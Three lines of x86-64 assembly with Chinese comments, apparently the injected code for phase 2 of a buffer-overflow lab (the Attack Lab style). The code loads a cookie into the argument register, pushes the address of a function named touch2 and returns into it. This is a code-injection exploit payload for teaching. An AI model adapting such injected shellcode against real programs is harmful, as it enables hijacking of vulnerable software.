movl	$0x59b997fa,%edi	# 设置 touch2 的参数 val 为 cookie
pushq	$0x4017ec		# 压入 touch2 的起始地址
retq				# 弹出 touch2 的起始地址赋值给 PC
